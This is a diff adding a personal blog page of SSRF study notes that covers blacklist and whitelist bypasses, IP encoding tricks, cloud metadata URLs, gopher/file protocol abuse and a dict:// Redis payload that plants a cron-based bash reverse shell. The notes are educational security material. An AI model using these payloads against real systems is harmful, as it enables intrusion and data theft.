@@ -1,0 +1,412 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>深入浅出SSRF（一） ： 我的学习笔记 | 持剑</title>
+<meta name="description" content="碎月星辰揽江风 , 我心有剑问天涯 ">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://1dayluo.github.io/favicon.ico?v=1711284755357">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://1dayluo.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://1dayluo.github.io">
+        <img class="avatar" src="https://1dayluo.github.io/images/avatar.png?v=1711284755357" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://1dayluo.github.io">
+        <h1 class="site-title">持剑</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+          <h2 class="post-title">深入浅出SSRF（一） ： 我的学习笔记</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2022-11-30</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://1dayluo.github.io/tag/ZYt2rq1nxl/">
+                    笔记
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://1dayluo.github.io/tag/zZTzpgyiG3k/">
+                    SSRF
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content" v-pre>
+            <h1 id="ssrfserver-side-request-forgery">SSRF(Server-Side Request Forgery)</h1>
+<aside>
+💡 Make sure the request comes from the remote server and not your personal IP address
+</aside>
+<h2 id="what-is-ssrf">What is SSRF?</h2>
+<p>诱导服务端应用程序去访问由攻击者控制的任意地址,攻击者能滥用该功能在服务器上去读取或更新内部资源.</p>
+<p>(request的行为是由服务端发起的)</p>
+<ul>
+<li>Blind SSRF - Allows to scan for accessible hosts and ports</li>
+<li>Full Response - Allows you to see the entire resposne from the server</li>
+<li>Limited or Response - Shows a portion of the response like the title of the page or No Response or you have access to resources but can’t see them directly</li>
+</ul>
+<h3 id="blind-ssrf">Blind SSRF</h3>
+<ul>
+<li>
+<p>使用SSRF测试开放端口</p>
+<ul>
+<li>根据返回时间判断端口是否开放</li>
+</ul>
+</li>
+</ul>
+<p>还可以使用：</p>
+<ul>
+<li>Javascript</li>
+<li>exfil data</li>
+</ul>
+<h3 id="full-response">Full Response</h3>
+<p>不受限制，直接从response中获取到信息</p>
+<h3 id="limited-response">Limited Response</h3>
+<p>需要进行分析</p>
+<h2 id="disclose-information">Disclose information</h2>
+<ol>
+<li>端口</li>
+</ol>
+<ul>
+<li>测试端口参考（可以测这些）
+<ul>
+<li>21, (FTP)</li>
+<li>22, (SSH)</li>
+<li>80, (Web)</li>
+<li>443, (SSL Web)</li>
+<li>8080, (Proxy)</li>
+</ul>
+</li>
+</ul>
+<ol start="2">
+<li>允许的协议：</li>
+</ol>
+<ul>
+<li>gopher:// (File Distribution)</li>
+<li>dict:// ( dictionary network protocol)</li>
+<li>ftp:// (File Transfer Protocol)</li>
+<li>File:// (File URI Scheme)</li>
+<li>ldap:// ( Lightweight Directory Access Protocol*)*</li>
+</ul>
+<ol start="3">
+<li>真实ip地址：</li>
+</ol>
+<ul>
+<li>通过response的头部或其他输出</li>
+</ul>
+<ol start="4">
+<li>其他信息泄漏方式（收集中）</li>
+</ol>
+<ul>
+<li>use incomplete HTTP protocol （ <a href="https://infosecwriteups.com/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a">https://infosecwriteups.com/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a</a> ）
+<ul>
+<li><a href="https://infosecwriteups.com/%5B::%5D.">http://[::]</a></li>
+<li>http://</li>
+</ul>
+</li>
+</ul>
+<h2 id="make-sure-request-comes-from-the-remote-server">Make sure request comes from the remote server</h2>
+<h3 id="使用nc">使用nc</h3>
+<p>如果监听到的ip地址非本地,证明请求是从本地浏览器发起的</p>
+<p>命令:</p>
+<pre><code class="language-jsx">nc -lvp 8000
+</code></pre>
+<h3 id="使用burpsuite">使用Burpsuite</h3>
+<aside>
+💡 在blind ssrf下也可以使用burp
+</aside>
+<p>Step 1:使用burp下”burp collaborator client”,然后将地址复制到ssrf位置</p>
+<p>Step 2: 查看collaborator client 下的history 是否是本地ip地址</p>
+<h2 id="bypass-blacklist">Bypass Blacklist</h2>
+<h3 id="fooling-it-with-redirects">Fooling it with redirects</h3>
+<p>For example, you can host a file with the following content on your web server:</p>
+<pre><code class="language-html">&lt;?php header(“location: http://127.0.0.1&quot;); ?&gt;
+</code></pre>
+<p>Let’s say this file is hosted at <em>http:</em>//<em>attacker.com/redirect.php</em><br>
+. This way, when you make the target server request <em>http:</em>//<em>attacker.com/redirect.php</em>, the target server is actually redirected to http://127.0.0.1, a restricted internal address.</p>
+<p>备注：</p>
+<ul>
+<li>即使没有办法bypass，也可以尝试测信道攻击，看response的头部是否包含内部的ip地址，例如 <code>X-Forwarded-For</code></li>
+</ul>
+<h3 id="tricking-it-with-dns">Tricking it with DNS</h3>
+<p>Modify the A/AAAA record of a domain you control and make it point to internal addresses of the victim’s network.</p>
+<p>网站:</p>
+<ul>
+<li><a href="http://xip.io">xip.io</a> (好像不能用了)</li>
+<li><a href="https://nip.io/">https://nip.io/</a></li>
+<li><a href="https://sslip.io/">https://sslip.io/</a> (受xip.io的 启发)</li>
+<li><a href="https://v2ex.com/t/863767">https://v2ex.com/t/863767</a> v2ex上有人的帖子,CNAME指向了本地</li>
+</ul>
+<h3 id="using-ipv6-addresses">Using IPv6 addresses</h3>
+<p>Try using IPv6 addresses instead of IPv4. The protection mechanisms implemented for IPv4 might not have been implemented for IPv6.</p>
+<h3 id="switching-out-the-encoding">Switching out the encoding</h3>
+<p>There are many different ways of encoding a URL or an address that doesn’t change how a server interprets its location, but might let it slip under the radar of a blacklist. These include hex encoding, octal encoding, dword encoding, URL encoding, and mixed encoding.</p>
+<ul>
+<li>Hex Encoding</li>
+</ul>
+<p>Turns out that servers out there can understand IP addresses when they are hex encoded.Here’s an example:</p>
+<pre><code class="language-html">127.0.0.1 translates to 0x7f.0x0.0x0.0x1
+</code></pre>
+<p><strong>The “0x” at the beginning of each section designates it as a hex number.</strong></p>
+<p>• Octal Encoding</p>
+<p>Octal encoding is a way of representing characters in the base 8 format.For example,</p>
+<pre><code class="language-html">127.0.0.1 translates to 0177.0.0.01
+</code></pre>
+<p>In this case, the leading zeros are necessary to convey that that section is an octal number.</p>
+<p>• Dword Encoding</p>
+<p>“Dword” stands for “double word”, which is a 32-bit integer.An IP address is basically a 32-bit number,split into four octets (groups of eight bits),and written in the decimal format(groups of eight bits).</p>
+<p>how to get dword format IP address</p>
+<p>For example, 127.0.0.1 is actually the decimal representation of 01111111.00000000.00000000.00000001.. And when we translate the entire number(01111111000000000000000000000001) into one single decimal number, we get the IP address in dword format!</p>
+<p>So what is 127.0.0.1 in dword? It’s the answer for 127<em>256³+0</em>256²+0<em>256¹+1</em>256⁰, which is 2130706433,Meaning that if you type in <a href="http://127.0.0.1/">http://2130706433</a> instead of <a href="http://127.0.0.1/">http://127.0.0.1</a>, it would still be understood! Pretty cool right?</p>
+<ul>
+<li>URL Encoding</li>
+</ul>
+<p>For example, the word “localhost” can be represented with its URL encoded equivalent, “%6c%6f%63%61%6c%68%6f%73%74”.So when a server is blocking requests to internal hostnames such as “localhost”, try it’s URL encoded equivalent!</p>
+<ul>
+<li>Mixed Encoding</li>
+</ul>
+<p>It’s mix-and-match time!You could also use a combination of encoding techniques to try to fool the server: maybe this would work?</p>
+<pre><code class="language-html">127.0.0.1 translates to 0177.0.0.0x1
+</code></pre>
+<p>更多可以看这里: <a href="https://h.43z.one/ipconverter/">https://h.43z.one/ipconverter/</a></p>
+<h2 id="bypass-whitelists">Bypass Whitelists</h2>
+<p>Whitelists are generally harder to bypass because they are by default, stricter than blacklists.</p>
+<h3 id="open-redirect">open redirect</h3>
+<p>But it is possible if there is an open redirect vulnerability within the whitelisted domains.If you could find an open redirect, you can request a whitelisted URL that redirects to an internal URL.</p>
+<h3 id="not-correctly-implemented">not correctly implemented</h3>
+<p>eg. via poorly designed regex</p>
+<p>it could also be bypassed by using making a subdomain or directory as the whitelisted domain name (eg. <em>victim.com.attacker.com</em><br>
+ or <em>attacker.com/victim.com</em><br>
+).</p>
+<h2 id="协议的使用">协议的使用</h2>
+<aside>
+💡 注意：一些情况下。从 BP 里面抓包请求的话，空格得写成`%2520`
+，即两次 URL 编码才可以顺利执行
+</aside>
+<ul>
+<li>gopher:// (File Distribution)</li>
+<li>dict:// ( dictionary network protocol)</li>
+<li>ftp:// (File Transfer Protocol)</li>
+<li>File:// (File URI Scheme)</li>
+<li>ldap:// ( Lightweight Directory Access Protocol*)*</li>
+</ul>
+<p>如果是基于错误的ssrf，可以先根据response判断支持哪些协议</p>
+<h3 id="file协议下">file协议下：</h3>
+<ul>
+<li><code>file:///etc/passwd</code></li>
+<li><code>file:///etc/hosts</code> : 获取本机内网ip地址信息，从而确认当前资产网段信息</li>
+<li><code>[file://proc/net/arp](file://proc/net/arp)</code> or <code>[file://etc/network/interfaces](file://etc/network/interfaces)</code> ：当前机子网络情况</li>
+</ul>
+<h3 id="dict协议">DICT协议</h3>
+<p><strong>dict协议是什么?</strong></p>
+<p><a href="https://blog.51cto.com/u_15127673/4130760">https://blog.51cto.com/u_15127673/4130760</a></p>
+<p><strong>dict协议可以用来做什么?</strong></p>
+<ul>
+<li>探测端口开放服务</li>
+<li>攻击未授权的Redis服务</li>
+</ul>
+<p><strong>探测端口开放服务</strong></p>
+<p>使用ssrf配合DICT协议探测内网端口开放情况:</p>
+<p>也可使用http协议</p>
+<p><strong>使用dict协议构造反弹shell - redis</strong></p>
+<p><a href="https://www.sqlsec.com/2021/05/ssrf.html#toc-heading-2">https://www.sqlsec.com/2021/05/ssrf.html#toc-heading-2</a></p>
+<pre><code class="language-reason"># 清空 key
+dict://172.72.23.27:6379/flushall
+
+# 设置要操作的路径为定时任务目录
+dict://172.72.23.27:6379/config set dir /var/spool/cron/
+
+# 在定时任务目录下创建 root 的定时任务文件
+dict://172.72.23.27:6379/config set dbfilename root
+
+# 写入 Bash 反弹 shell 的 payload
+dict://172.72.23.27:6379/set x &quot;\n* * * * * /bin/bash -i &gt;%26 /dev/tcp/x.x.x.x/2333 0&gt;%261\n&quot;
+
+# 保存上述操作
+dict://172.72.23.27:6379/save
+</code></pre>
+<h3 id="gopher协议">Gopher协议</h3>
+<p><strong>为什么要用到gopher协议</strong></p>
+<figure data-type="image" tabindex="1"><img src="file:///tmp/Export-123bd238-d0e8-4c85-84f8-40e1fbe1d23a/SSRF(Server-Side%20Request%20Forgery)%208896444a46f64714b2a3d272739d77b6/Untitled%205.png?msec=1669820820598" alt="Untitled" loading="lazy"></figure>
+<p>这里是用到gopher协议传递HTTP的POST请求(SSRF漏洞无法直接发起POST请求)</p>
+<p><strong>构造请求包</strong></p>
+<p>step1: 抓取请求包</p>
+<p>step2: 删除HTTP请求的</p>
+<pre><code class="language-reason">Accept-Encoding: gzip, deflate
+</code></pre>
+<p>step3: url两次编码整个post请求</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2022_11/Untitled%206.png" alt="Untitled" loading="lazy"></figure>
+<p>step4: 将编码后的请求作为TCP数据流传入gopher请求中:</p>
+<pre><code>url=gopher://172.72.23.24:80/&lt;两次url编码的TCP数据流&gt;
+</code></pre>
+<p>step5: 成功执行命令</p>
+<p>场景:</p>
+<ul>
+<li>考虑file协议结合XXE外部实体注入,实现ssrf</li>
+<li>ssrf 升级为RCE(通过mysql)</li>
+</ul>
+<h2 id="proof">Proof</h2>
+<p>特征可参考: 各种云服务器/中间件 [ 个人notion笔记 我blog没有更嘻嘻]</p>
+<h3 id="aws">AWS</h3>
+<ul>
+<li>http://{your-ip}/metadata/v1</li>
+<li>http://{your-ip}/latest/metadata</li>
+</ul>
+<h3 id="google-gcp">Google GCP</h3>
+<ul>
+<li>http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token</li>
+</ul>
+<h2 id="escalate-to-rce">escalate to RCE</h2>
+<h3 id="aws-2">AWS</h3>
+<p>参考AWS下的 ,写的很详细。貌似从我个人笔记搬运到blog里了，可以参考那一篇=-=</p>
+<h3 id="mysql">MySQL</h3>
+<p>不想搬运。。。也是notion笔记有写。blog改排版，累。</p>
+<h2 id="出现的地方总结">出现的地方总结</h2>
+<ul>
+<li>url里用base64编码（<a href="https://blog.neolex.dev/13/">例子</a>）</li>
+<li>Any customization that involves HTML/CSS (Font name, colors, styling)</li>
+<li>pushed to the PDF( PDF+XSS ==SSRF)</li>
+</ul>
+<h2 id="reference">Reference</h2>
+<p>Udemy</p>
+<ul>
+<li><a href="https://www.udemy.com/course/intro-to-bug-bounty-by-nahamsec/learn/lecture/24998004#overview">https://www.udemy.com/course/intro-to-bug-bounty-by-nahamsec/learn/lecture/24998004#overview</a></li>
+</ul>
+<p>Medium</p>
+<ul>
+<li><a href="https://vickieli.medium.com/bypassing-ssrf-protection-e111ae70727b">https://vickieli.medium.com/bypassing-ssrf-protection-e111ae70727b</a></li>
+<li><a href="https://infosecwriteups.com/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a">https://infosecwriteups.com/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a</a></li>
+</ul>
+<p>PPT</p>
+<ul>
+<li>Google doc
+<ul>
+<li><a href="https://docs.google.com/presentation/d/1JdIjHHPsFSgLbaJcHmMkE904jmwPM4xdhEuwhy2ebvo/htmlpresent">https://docs.google.com/presentation/d/1JdIjHHPsFSgLbaJcHmMkE904jmwPM4xdhEuwhy2ebvo/htmlpresent</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://1dayluo.github.io/post/cve-2018-0114/">
+              <h3 class="post-title">
+                下一篇：CVE-2018-0114 POC编写与实践
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan">碎月星辰揽江风 , 我心有剑问天涯 </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+   | <a class="rss" href="https://1dayluo.github.io/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
